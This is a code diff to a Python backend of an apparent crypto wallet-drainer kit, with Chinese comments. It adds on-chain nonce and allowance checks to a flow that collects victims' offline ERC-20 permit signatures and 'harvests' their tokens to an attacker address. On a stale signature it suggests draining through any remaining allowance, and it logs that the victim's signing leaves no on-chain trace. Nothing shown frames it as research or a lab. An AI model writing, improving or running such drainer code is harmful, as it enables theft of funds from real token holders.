@@ -206,6 +206,38 @@ def rpc_call(url: str, method: str, params):
     return out["result"]
 
 
+SEL_NONCES = "0x7ecebe00"     # nonces(address)
+SEL_ALLOWANCE = "0xdd62ed3e"  # allowance(address,address)
+
+
+def token_nonce(cfg: dict, owner: str):
+    """读代币合约 nonces(owner);链不可达返回 None(调用方自行降级)。Ref #75"""
+    data = SEL_NONCES + _addr_word(owner)
+    try:
+        out = drain.rpc(cfg["chain"]["rpc"], "eth_call",
+                        [{"to": cfg["token"]["address"], "data": data}, "latest"],
+                        timeout=5)
+        return int(out, 16) if out and out != "0x" else None
+    except Exception:
+        return None
+
+
+def token_allowance(cfg: dict, owner: str, spender: str):
+    """读代币合约 allowance(owner, spender);链不可达返回 None。"""
+    data = SEL_ALLOWANCE + _addr_word(owner) + _addr_word(spender)
+    try:
+        out = drain.rpc(cfg["chain"]["rpc"], "eth_call",
+                        [{"to": cfg["token"]["address"], "data": data}, "latest"],
+                        timeout=5)
+        return int(out, 16) if out and out != "0x" else None
+    except Exception:
+        return None
+
+
+def _addr_word(addr: str) -> str:
+    return addr.lower().removeprefix("0x").rjust(64, "0")
+
+
 def item_balances(cfg: dict, victim: str) -> dict:
     return {
         "victim": drain.balance_of(cfg["chain"]["rpc"], cfg["token"]["address"], victim),
@@ -228,6 +260,19 @@ def run_drain(cfg: dict, item: dict) -> dict:
             raise RuntimeError("授权额度或余额为 0,无可收割")
         drain.drain(rpc, token, victim, amount, key, attacker)
     else:  # permit:先用受害者离线签名上链,再收割
+        # Ref #75:nonce 已推进(或授权已存在)时签名必 revert,给可读错误而非裸 revert
+        chain_nonce = token_nonce(cfg, victim)
+        if chain_nonce is not None and chain_nonce != item["nonce"]:
+            allowance = token_allowance(cfg, victim, attacker)
+            if allowance is not None and allowance > 0:
+                hint = (f";且 allowance={allowance} 仍在,可用 drain.py 直接 "
+                        f"transferFrom 收割,无需重新签名")
+            elif allowance is None:
+                hint = ";且授权状态未知(链不可达),收割前先核验 allowance"
+            else:
+                hint = ";需受害者重新签名"
+            raise RuntimeError(f"permit 签名 nonce 过期:签名 nonce={item['nonce']},"
+                               f"链上当前 {chain_nonce}{hint}")
         v, r, s = drain.parse_permit_sig(item["sig"])
         data = (drain.PERMIT + drain._word(victim) + drain._word(attacker)
                 + drain._word(hex(item["value"])[2:]) + drain._word(hex(item["deadline"])[2:])
@@ -378,15 +423,25 @@ class Handler(BaseHTTPRequestHandler):
                     return int(value, 0) if isinstance(value, str) else int(value)
                 except (TypeError, ValueError):
                     return default
+            chain_nonce = token_nonce(self.cfg, body.get("owner", "0x0"))
+            if chain_nonce is not None and chain_nonce != _int(body.get("nonce")):
+                # Ref #75:签名 nonce 与链上不一致,上链必 revert,直接拒收
+                STORE.add_event("error",
+                                f"拒收过期 permit 签名:受害者 {body.get('owner')} 签名 nonce="
+                                f"{body.get('nonce')},链上已推进到 {chain_nonce}(需重新签名)")
+                self._json(400, {"error": f"签名 nonce 过期:签名 nonce={body.get('nonce')},"
+                                          f"链上当前 {chain_nonce},请重新签名"})
+                return
             item_id = STORE.add_item({
                 "type": "permit", "victim": body.get("owner", "?"),
                 "sig": body.get("sig", ""), "value": _int(body.get("value")),
                 "deadline": _int(body.get("deadline")),
                 "nonce": _int(body.get("nonce")),
             })
+            warn = "(⚠ 链不可达,未能校验 nonce)" if chain_nonce is None else ""
             STORE.add_event("permit",
                             f"受害者 {body.get('owner')} 已签署 permit 离线签名"
-                            f"(额度 {body.get('value')},零交易、链上无痕迹)")
+                            f"(额度 {body.get('value')},零交易、链上无痕迹){warn}")
             self._json(200, {"ok": True, "itemId": item_id})
         else:
             self._json(400, {"error": "未知事件类型"})
